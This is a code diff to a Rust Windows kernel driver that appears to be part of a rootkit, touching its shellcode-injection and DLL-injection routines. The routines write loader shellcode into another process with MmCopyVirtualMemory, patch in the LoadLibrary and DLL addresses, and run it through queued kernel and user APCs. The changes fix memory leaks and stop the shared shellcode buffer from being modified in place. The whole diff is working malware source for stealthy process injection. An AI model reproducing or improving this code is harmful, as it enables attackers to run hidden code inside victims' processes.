@@ -6,17 +6,15 @@ use wdk_sys::{
     *,
 };
 
-use crate::*;
 use crate::{
     attach::ProcessAttach, 
     handle::Handle, 
     pool::PoolMemory, 
-};
-use crate::{
+    process::Process,
     data::KAPC_ENVIROMENT::OriginalApcEnvironment,
     error::{ShadowError, ShadowResult},
     file::read_file,
-    patterns::{find_zw_function, LDR_SHELLCODE},
+    patterns::{find_zw_function, LDR_SHELLCODE, find_thread_alertable, find_thread, get_function_peb, ZwCreateThreadExFn},
 };
 
 pub mod shellcode {
@@ -220,21 +218,13 @@ pub mod shellcode {
         }
 
         // Allocate memory for kernel and user APC objects
-        let user_apc = PoolMemory::new(POOL_FLAG_NON_PAGED, size_of::<KAPC>() as u64, "krts")
-            .map(|mem: PoolMemory| {
-                let ptr = mem.ptr as *mut _KAPC;
-                core::mem::forget(mem);
-                ptr
-            })
+        let user_apc_mem = PoolMemory::new(POOL_FLAG_NON_PAGED, size_of::<KAPC>() as u64, "krts")
             .ok_or(ShadowError::FunctionExecutionFailed("PoolMemory", line!()))?;
+        let user_apc = user_apc_mem.ptr as *mut _KAPC;
 
-        let kernel_apc = PoolMemory::new(POOL_FLAG_NON_PAGED, size_of::<KAPC>() as u64, "urds")
-            .map(|mem: PoolMemory| {
-                let ptr = mem.ptr as *mut _KAPC;
-                core::mem::forget(mem);
-                ptr
-            })
+        let kernel_apc_mem = PoolMemory::new(POOL_FLAG_NON_PAGED, size_of::<KAPC>() as u64, "urds")
             .ok_or(ShadowError::FunctionExecutionFailed("PoolMemory", line!()))?;
+        let kernel_apc = kernel_apc_mem.ptr as *mut _KAPC;
 
         // Initialize the kernel APC
         KeInitializeApc(
@@ -269,6 +259,10 @@ pub mod shellcode {
         if !KeInsertQueueApc(kernel_apc, null_mut(), null_mut(), 0) {
             return Err(ShadowError::ApiCallFailed("KeInsertQueueApc [2]", -1));
         }
+
+        // ONLY forget memory after successful insertion!
+        core::mem::forget(user_apc_mem);
+        core::mem::forget(kernel_apc_mem);
 
         Ok(status)
     }
@@ -563,12 +557,13 @@ pub mod dll {
             ));
         }
 
-        LDR_SHELLCODE[6..14].copy_from_slice(&(load_library as usize).to_le_bytes());
-        LDR_SHELLCODE[16..24].copy_from_slice(&(base_address as usize).to_le_bytes());
+        let mut local_shellcode = LDR_SHELLCODE;
+        local_shellcode[6..14].copy_from_slice(&(load_library as usize).to_le_bytes());
+        local_shellcode[16..24].copy_from_slice(&(base_address as usize).to_le_bytes());
 
         MmCopyVirtualMemory(
             IoGetCurrentProcess(),
-            LDR_SHELLCODE.as_ptr().cast_mut().cast(),
+            local_shellcode.as_ptr().cast_mut().cast(),
             target_eprocess.e_process,
             shellcode_address,
             shellcode_size,
@@ -577,21 +572,13 @@ pub mod dll {
         );
 
         // Allocate memory for kernel and user APC objects
-        let user_apc = PoolMemory::new(POOL_FLAG_NON_PAGED, size_of::<KAPC>() as u64, "krts")
-            .map(|mem: PoolMemory| {
-                let ptr = mem.ptr as *mut _KAPC;
-                core::mem::forget(mem);
-                ptr
-            })
+        let user_apc_mem = PoolMemory::new(POOL_FLAG_NON_PAGED, size_of::<KAPC>() as u64, "krts")
             .ok_or(ShadowError::FunctionExecutionFailed("PoolMemory", line!()))?;
+        let user_apc = user_apc_mem.ptr as *mut _KAPC;
 
-        let kernel_apc = PoolMemory::new(POOL_FLAG_NON_PAGED, size_of::<KAPC>() as u64, "urds")
-            .map(|mem: PoolMemory| {
-                let ptr = mem.ptr as *mut _KAPC;
-                core::mem::forget(mem);
-                ptr
-            })
+        let kernel_apc_mem = PoolMemory::new(POOL_FLAG_NON_PAGED, size_of::<KAPC>() as u64, "urds")
             .ok_or(ShadowError::FunctionExecutionFailed("PoolMemory", line!()))?;
+        let kernel_apc = kernel_apc_mem.ptr as *mut _KAPC;
 
         // Initialize the kernel APC
         KeInitializeApc(
@@ -626,6 +613,10 @@ pub mod dll {
         if !KeInsertQueueApc(kernel_apc, null_mut(), null_mut(), 0) {
             return Err(ShadowError::ApiCallFailed("KeInsertQueueApc [2]", -1));
         }
+
+        // ONLY forget memory after successful insertion!
+        core::mem::forget(user_apc_mem);
+        core::mem::forget(kernel_apc_mem);
 
         Ok(STATUS_SUCCESS)
     }
